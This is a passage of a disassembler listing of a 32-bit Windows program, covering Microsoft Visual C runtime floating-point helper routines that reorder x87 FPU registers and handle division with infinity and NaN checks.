arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fld	[esp+arg_1C]
		fxch	st(1)
		add	esp, 2Ch
		retn
sub_41D7C2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41D7DE	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 10

sub_41D7E3	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fld	[esp+arg_8]
		fxch	st(1)
		add	esp, 2Ch
		retn
sub_41D7E3	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41D7F9	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 12

sub_41D7FE	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(1)
		fstp	[esp+arg_8]	; _TBYTE
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41D7FE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 13

sub_41D81A	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		add	esp, 2Ch
		retn
sub_41D81A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 14

sub_41D82A	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41D82A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 15

sub_41D83E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		add	esp, 2Ch
		retn
sub_41D83E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 16

sub_41D84E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(1)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		fld	[esp+arg_1C]
		fxch	st(2)
		add	esp, 2Ch
		retn
sub_41D84E	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41D86E	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 18

sub_41D873	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(1)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		fld	[esp+arg_8]
		fxch	st(2)
		add	esp, 2Ch
		retn
sub_41D873	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41D88D	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 20

sub_41D892	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(2)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(1)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41D892	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 21

sub_41D8B2	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(1)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		add	esp, 2Ch
		retn
sub_41D8B2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 22

sub_41D8C6	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(1)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41D8C6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 23

sub_41D8DE	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(1)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(1)
		add	esp, 2Ch
		retn
sub_41D8DE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 24

sub_41D8F2	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(2)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		fld	[esp+arg_1C]
		fxch	st(3)
		add	esp, 2Ch
		retn
sub_41D8F2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41D912	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 26

sub_41D917	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(2)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		fld	[esp+arg_8]
		fxch	st(3)
		add	esp, 2Ch
		retn
sub_41D917	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41D931	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 28

sub_41D936	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(3)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(2)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41D936	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 29

sub_41D956	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(2)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		add	esp, 2Ch
		retn
sub_41D956	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 30

sub_41D96A	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(2)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41D96A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 31

sub_41D982	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(2)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(2)
		add	esp, 2Ch
		retn
sub_41D982	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 32

sub_41D996	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(3)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		fld	[esp+arg_1C]
		fxch	st(4)
		add	esp, 2Ch
		retn
sub_41D996	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41D9B6	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 34

sub_41D9BB	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(3)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		fld	[esp+arg_8]
		fxch	st(4)
		add	esp, 2Ch
		retn
sub_41D9BB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41D9D5	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 36

sub_41D9DA	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(4)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(3)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41D9DA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 37

sub_41D9FA	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(3)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		add	esp, 2Ch
		retn
sub_41D9FA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 38

sub_41DA0E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(3)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41DA0E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 39

sub_41DA26	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(3)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(3)
		add	esp, 2Ch
		retn
sub_41DA26	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 40

sub_41DA3A	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(4)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		fld	[esp+arg_1C]
		fxch	st(5)
		add	esp, 2Ch
		retn
sub_41DA3A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41DA5A	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 42

sub_41DA5F	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(4)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		fld	[esp+arg_8]
		fxch	st(5)
		add	esp, 2Ch
		retn
sub_41DA5F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41DA79	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 44

sub_41DA7E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(5)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(4)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41DA7E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 45

sub_41DA9E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(4)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		add	esp, 2Ch
		retn
sub_41DA9E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 46

sub_41DAB2	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(4)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41DAB2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 47

sub_41DACA	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(4)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(4)
		add	esp, 2Ch
		retn
sub_41DACA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 48

sub_41DADE	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(5)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		fld	[esp+arg_1C]
		fxch	st(6)
		add	esp, 2Ch
		retn
sub_41DADE	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41DAFE	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 50

sub_41DB03	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(5)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		fld	[esp+arg_8]
		fxch	st(6)
		add	esp, 2Ch
		retn
sub_41DB03	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41DB1D	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 52

sub_41DB22	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(6)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(5)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41DB22	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 53

sub_41DB42	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(5)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		add	esp, 2Ch
		retn
sub_41DB42	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 54

sub_41DB56	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(5)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41DB56	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 55

sub_41DB6E	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(5)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(5)
		add	esp, 2Ch
		retn
sub_41DB6E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 56

sub_41DB82	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(6)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		fld	[esp+arg_1C]
		fxch	st(7)
		add	esp, 2Ch
		retn
sub_41DB82	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41DBA2	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 58

sub_41DBA7	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(6)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		fld	[esp+arg_8]
		fxch	st(7)
		add	esp, 2Ch
		retn
sub_41DBA7	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41DBC1	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 60

sub_41DBC6	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
arg_1C		= tbyte	ptr  20h

		fxch	st(7)
		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(6)
		fld	st
		fstp	tbyte ptr [esp+0] ; _TBYTE
		fstp	[esp+arg_1C]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		fld	[esp+arg_1C]
		add	esp, 2Ch
		retn
sub_41DBC6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 61

sub_41DBE6	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	tbyte ptr [esp+0] ; _TBYTE
		fxch	st(6)
		fstp	[esp+arg_8]	; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		add	esp, 2Ch
		retn
sub_41DBE6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 62

sub_41DBFA	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(6)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		fld	[esp+arg_8]
		add	esp, 2Ch
		retn
sub_41DBFA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 63

sub_41DC12	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch

		fstp	[esp+arg_8]	; _TBYTE
		fxch	st(6)
		fstp	tbyte ptr [esp+0] ; _TBYTE
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		fxch	st(6)
		add	esp, 2Ch
		retn
sub_41DC12	endp ; sp-analysis failed

; [00000013 BYTES: COLLAPSED FUNCTION unknown_libname_3. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000013 BYTES: COLLAPSED FUNCTION unknown_libname_4. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

unknown_libname_5:			; Microsoft VisualC 2-11/net runtime
		push	eax
		mov	eax, [esp+8]
		and	eax, 7F800000h
		cmp	eax, 7F800000h
		jz	short loc_41DC90
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DC73
		fld	dword ptr [esp+8]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DC73:				; CODE XREF: .text:0041DC64j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fld	dword ptr [esp+14h]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DC90:				; CODE XREF: .text:0041DC5Bj
		fdiv	dword ptr [esp+8]
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_6:			; Microsoft VisualC 2-11/net runtime
		push	eax
		mov	eax, [esp+0Ch]
		and	eax, 7FF00000h
		cmp	eax, 7FF00000h
		jz	short loc_41DCDC
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DCBF
		fld	qword ptr [esp+8]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

loc_41DCBF:				; CODE XREF: .text:0041DCB0j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fld	qword ptr [esp+14h]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

loc_41DCDC:				; CODE XREF: .text:0041DCA7j
		fdiv	qword ptr [esp+8]
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

unknown_libname_7:			; Microsoft VisualC 2-11/net runtime
		push	eax
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DCFB
		fild	word ptr [esp+8]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DCFB:				; CODE XREF: .text:0041DCECj
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fild	word ptr [esp+14h]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_8:			; Microsoft VisualC 2-11/net runtime
		push	eax
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DD2F
		fild	dword ptr [esp+8]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DD2F:				; CODE XREF: .text:0041DD20j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fild	dword ptr [esp+14h]
		call	unknown_libname_3 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_9:			; Microsoft VisualC 2-11/net runtime
		push	eax
		mov	eax, [esp+8]
		and	eax, 7F800000h
		cmp	eax, 7F800000h
		jz	short loc_41DD90
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DD73
		fld	dword ptr [esp+8]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DD73:				; CODE XREF: .text:0041DD64j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fld	dword ptr [esp+14h]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DD90:				; CODE XREF: .text:0041DD5Bj
		fdivr	dword ptr [esp+8]
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_10:			; Microsoft VisualC 2-11/net runtime
		push	eax
		mov	eax, [esp+0Ch]
		and	eax, 7FF00000h
		cmp	eax, 7FF00000h
		jz	short loc_41DDDC
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DDBF
		fld	qword ptr [esp+8]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

loc_41DDBF:				; CODE XREF: .text:0041DDB0j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fld	qword ptr [esp+14h]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

loc_41DDDC:				; CODE XREF: .text:0041DDA7j
		fdivr	qword ptr [esp+8]
		pop	eax
		retn	8
; ---------------------------------------------------------------------------

unknown_libname_11:			; Microsoft VisualC 2-11/net runtime
		push	eax
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DDFB
		fild	word ptr [esp+8]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DDFB:				; CODE XREF: .text:0041DDECj
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fild	word ptr [esp+14h]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_12:			; Microsoft VisualC 2-11/net runtime
		push	eax
		fnstsw	ax
		and	eax, 3800h
		jz	short loc_41DE2F
		fild	dword ptr [esp+8]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

loc_41DE2F:				; CODE XREF: .text:0041DE20j
		fxch	st(1)
		sub	esp, 0Ch
		fstp	tbyte ptr [esp]
		fild	dword ptr [esp+14h]
		call	unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
		fld	tbyte ptr [esp]
		fxch	st(1)
		add	esp, 0Ch
		pop	eax
		retn	4
; ---------------------------------------------------------------------------

unknown_libname_13:			; Microsoft VisualC 2-11/net runtime
